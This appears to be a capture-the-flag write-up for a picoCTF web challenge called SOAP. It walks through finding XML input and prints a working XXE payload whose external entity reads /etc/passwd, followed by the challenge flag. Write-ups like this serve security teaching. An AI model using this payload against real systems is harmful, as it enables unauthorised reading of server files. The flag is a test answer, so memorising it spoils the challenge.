# web/SOAP
Write-up by: [ptrckstuns](https://github.com/ptrckstuns)

## Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Solution
1. By analyzing the web application, a hint is discovered from this javascript file.
   ![](/attachments/soap1.png)
   > Smart guess is XML Injection or XXE
2. By observing the requests, the web application sends a request with XML as payload.
   ![](/attachments/soap2.png)
3. Craft an XML injection / XXE payload
    ```xml
    <!--?xml version="1.0" ?-->
    <!DOCTYPE joyuriz [<!ENTITY flag SYSTEM "file:///etc/passwd"> ]>
    <data>
    <ID>&flag;</ID>
    </data>
    ```
4. Send the request with malicious payload. Observe the result.
   ![](/attachments/soap3.png)

**Flag:** `picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}`